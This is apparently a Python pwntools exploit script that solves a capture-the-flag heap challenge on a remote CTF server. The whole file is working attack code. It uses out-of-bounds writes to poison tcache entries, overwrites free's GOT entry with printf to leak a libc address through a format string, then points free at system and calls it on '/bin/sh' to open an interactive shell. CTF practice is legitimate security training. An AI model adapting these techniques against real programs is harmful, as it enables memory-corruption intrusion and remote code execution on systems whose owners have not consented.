#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def paint(i, j, k):
	sla(b"> ", b"p")
	payload = f"{i} {j} ".encode() + (str(hex(k))[2::]).encode()
	sl(payload)

def resize(i, j):
	sla(b"> ", b"r")
	payload = f"{i} {j}".encode()
	sl(payload)

def overwrite(offset, val):
	for i in range(8):
		paint(0, offset + i, val & 0xff)
		val = val >> 8

def fmt_str(payload):
	n = len(payload)
	for i in range(n):
		overwrite(i, payload[i])
	resize(1, 0x58) # just need to not use 0x30 chunk

script = '''
b *main + 182
'''

p = remote("speedpwn-2.chals.sekai.team", 1337, ssl = True)
#p = process('./chall_patched')
#p = gdb.debug('./chall_patched', gdbscript = script)

# attack the tcache per thread
overwrite(-0x290, 1) # tcache cnt 0x20
overwrite(-0x210, 0x404080) # tcache entry 0x20
overwrite(-0x290 + 4, 1) # tcache cnt 0x40
overwrite(-0x200, 0x404080) # tcache entry 0x40

# malloc to [0x404080]
resize(1, 0x18)

# modify free got -> printf plt
printf_plt = exe.plt['printf']
overwrite(-0x80, printf_plt) # now free(buf) = printf(buf)

# leak libc
fmt_str(b"%17$p\n\x00")
libc_base = int(p.recvline(), 16) - 0x2a1ca
lleak("libc_base", libc_base)

# malloc to [0x404080]
resize(1, 0x38)

# modify free got -> system
system = libc_base + libc.symbols['system']
overwrite(-0x80, system)
overwrite(0, u64(b"/bin/sh\x00"))

# free("/bin/sh") = shell
resize(0, 0)

p.interactive()
